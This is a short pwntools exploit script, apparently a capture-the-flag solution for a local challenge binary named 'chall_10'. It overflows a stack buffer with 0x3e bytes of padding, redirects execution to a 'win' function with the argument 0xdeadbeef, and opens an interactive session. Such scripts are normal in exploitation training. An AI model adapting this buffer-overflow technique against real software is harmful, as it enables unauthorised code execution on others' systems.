from pwn import *

binary = context.binary = ELF('./chall_10')

p = process('./chall_10')
p.recv()

payload  = b''
payload += 0x3e * b'A'
payload += p32(binary.sym.win)
payload += p32(0)
payload += p32(0xdeadbeef)

p.sendline(payload)
p.interactive()
